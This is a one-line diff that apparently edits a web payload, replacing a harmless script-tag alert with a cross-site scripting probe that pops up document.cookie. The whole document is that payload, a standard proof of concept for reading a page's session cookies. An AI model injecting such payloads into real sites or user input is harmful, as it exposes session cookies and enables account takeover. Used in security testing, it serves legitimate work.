@@ -1,1 +1,1 @@
-<script>alert('ily');</script>
+<script>alert(document.cookie);</script>
